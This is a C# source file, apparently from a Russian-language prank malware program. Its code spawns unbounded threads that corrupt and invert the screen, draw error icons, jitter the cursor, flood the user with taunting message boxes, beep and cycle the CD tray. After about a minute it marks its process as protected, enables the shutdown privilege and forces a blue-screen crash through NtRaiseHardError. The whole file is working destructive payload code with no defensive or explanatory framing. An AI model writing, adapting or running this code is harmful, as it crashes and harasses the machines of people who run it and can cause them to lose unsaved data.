using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace PoraKushat
{
    class BSoD
    {

        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern bool SetWindowText(IntPtr hwnd, String lpString);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, ExactSpelling = true, SetLastError = true)]
        internal static extern bool GetWindowRect(IntPtr hWnd, ref RECT rect);

        [DllImport("user32.dll", SetLastError = true)]
        internal static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi)]
        protected static extern int mciSendString(string lpstrCommand, StringBuilder lpstrReturnString, int uReturnLength, IntPtr hwndCallback);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("gdi32")]
        static extern IntPtr CreateDC(string lpszDriver, string lpszDevice, string lpszOutput, string lpInitData);

        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int rop);

        [DllImport("user32")]
        static extern int GetSystemMetrics(int smIndex);

        [DllImport("user32")]
        static extern bool GetCursorPos(out POINT lpPoint);

        [DllImport("user32")]
        static extern bool DrawIcon(IntPtr hdc, int xLeft, int yTop, IntPtr hIcon);

        [DllImport("user32")]
        static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);

        [DllImport("gdi32")]
        static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);

        internal struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        static int width = GetSystemMetrics(0);
        static int height = GetSystemMetrics(1);

        public static void Invert()
        {
            while (true)
            {
                Thread.Sleep(100);
                IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                BitBlt(hdc, 0, 0, width, height, hdc, 0, 0, 0x00550009);
            }
        }

        struct POINT
        {
            public int x;
            public int y;
        }

        public static void ProcessCDTray(bool open)
        {
            switch (open)
            {
                case true:
                    mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
                    break;
                case false:
                    mciSendString("set cdaudio door closed", null, 0, IntPtr.Zero);
                    break;
                default:
                    mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
                    break;
            }
        }

        public static void CDtrayFun()
        {
            bool x = true;

            while (true)
            {
                ProcessCDTray(x);

                if (x == true) x = false;
                else x = true;
            }
        }

        public static void Errors()
        {
            int ix = GetSystemMetrics(11) / 2;
            int iy = GetSystemMetrics(12) / 2;
            while (true)
            {
                IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                GetCursorPos(out POINT cursor);
                IntPtr icon = LoadIcon(IntPtr.Zero, 32513);
                DrawIcon(hdc, cursor.x - ix, cursor.y - iy, icon);
                DrawIcon(hdc, r.Next(0, width), r.Next(0, height), icon);
            }
        }

        static void Tunnel()
        {
            while (true)
            {
                IntPtr hDC = CreateDC("DISPLAY", null, null, null);
                StretchBlt(hDC, 50, 50, width - 100, height - 100, hDC, 0, 0, width, height, 0x00CC0020);
                Thread.Sleep(20000);
            }
        }

        public static void Warnings()
        {
            while (true)
            {
                IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                IntPtr icon = LoadIcon(IntPtr.Zero, 32515);
                DrawIcon(hdc, r.Next(0, width), r.Next(0, height), icon);
            }
        }

        public static unsafe void Kill(uint code)
        {
            if (!Program.args.Contains("nobsod"))
            {
                ProcessProtection.Protect();
            }

            new Thread(Fun).Start();
            Thread.Sleep(60000);

            if (!Program.args.Contains("nobsod"))
            {
                bool tmp1;
                uint tmp2;
                RtlAdjustPrivilege(19, true, false, out tmp1);
                NtRaiseHardError(code, 0, 0, IntPtr.Zero, 6, out tmp2);
            }
        }

        public static unsafe void FastKill(uint code)
        {
            if (!Program.args.Contains("nobsod"))
            {
                ProcessProtection.Protect();

                bool tmp1;
                uint tmp2;
                RtlAdjustPrivilege(19, true, false, out tmp1);
                NtRaiseHardError(code, 0, 0, IntPtr.Zero, 6, out tmp2);

                Thread.Sleep(1000);

                Process.GetCurrentProcess().Kill();
            }
        }

        private static Random r = new Random();

        private static List<String> messages = new List<String> { "Синий экран в студию!!!", "Ты любишь синие экраны?", "Надо было кушать!", "Вы выиграли специальный приз - синий экран!", "Ты когда-нибудь видел синий экран? Нет? Теперь увидишь!", "Может всё-таки покушаешь?", "Лагает компьютер? Скачай PC Optimizer Pro!", "" };
        private static List<MessageBoxButtons> btns = new List<MessageBoxButtons> { MessageBoxButtons.OK, MessageBoxButtons.YesNo, MessageBoxButtons.OKCancel, MessageBoxButtons.AbortRetryIgnore, MessageBoxButtons.RetryCancel, MessageBoxButtons.YesNoCancel };
        private static List<MessageBoxIcon> icons = new List<MessageBoxIcon> { MessageBoxIcon.Asterisk, MessageBoxIcon.Error, MessageBoxIcon.Exclamation, MessageBoxIcon.Hand, MessageBoxIcon.Information, MessageBoxIcon.None, MessageBoxIcon.Question, MessageBoxIcon.Stop, MessageBoxIcon.Warning };
        private static List<MessageBoxDefaultButton> defBtns = new List<MessageBoxDefaultButton> { MessageBoxDefaultButton.Button1, MessageBoxDefaultButton.Button2, MessageBoxDefaultButton.Button3 };
        private static List<bool> bools = new List<bool> { true, false };

        private static void MoveMessageBox()
        {
            IntPtr hWnd = (IntPtr) 0;
            while (true)
            {
                while (hWnd == (IntPtr) 0)
                {
                    hWnd = FindWindow(null, "q");
                }

                RECT Rect = new RECT();
                GetWindowRect(hWnd, ref Rect);
                MoveWindow(hWnd, r.Next(0, Screen.PrimaryScreen.Bounds.Width), r.Next(0, Screen.PrimaryScreen.Bounds.Height), Rect.right - Rect.left, Rect.bottom - Rect.top, true);
                SetWindowText(hWnd, "FUN! FUN! FUN! FUN! FUN! FUN!");

                hWnd = (IntPtr) 0;
            }

        }

        public static void CurFun()
        {
            while (true)
            {
                Point pos = Cursor.Position;
                pos.X = pos.X + r.Next(-2, 3);
                pos.Y = pos.Y + r.Next(-2, 3);
                Cursor.Position = pos;
            }
        }

        public static void Glitches()
        {
            while (true)
            {
                IntPtr hdc = CreateDC("DISPLAY", null, null, null);
                Random random = new Random();
                int x1 = random.Next(0, width);
                int y1 = random.Next(0, height);
                int x2 = random.Next(0, width);
                int y2 = random.Next(0, height);
                int w = random.Next(0, width);
                int h = random.Next(0, height);
                BitBlt(hdc, x1, y1, w, h, hdc, x2, y2, 0x00CC0020);
            }
        }

        public static void Sounds()
        {
            while (true)
            {
                Beep.BeepBeep(1000, r.Next(1000, 6000), r.Next(100, 1000) );
            }
        }

        private static void FunMessageBox()
        {
            MessageBox.Show(messages[r.Next(messages.Count)], "q", btns[r.Next(btns.Count)], icons[r.Next(icons.Count)], defBtns[r.Next(defBtns.Count)], 0, bools[r.Next(bools.Count)]);
        }

        private static void MessageBoxes()
        {
            while (true)
            {
                new Thread(FunMessageBox).Start();
            }
        }

        public static void Fun()
        {
            new Thread(Sounds).Start();
            new Thread(CurFun).Start();
            new Thread(MoveMessageBox).Start();
            new Thread(MessageBoxes).Start();

            Thread.Sleep(40000);
            
            new Thread(Invert).Start();
            new Thread(Errors).Start();
            new Thread(Warnings).Start();
            new Thread(Tunnel).Start();

            Thread.Sleep(10000);

            new Thread(Glitches).Start();
            new Thread(CDtrayFun).Start();
        }
    }
}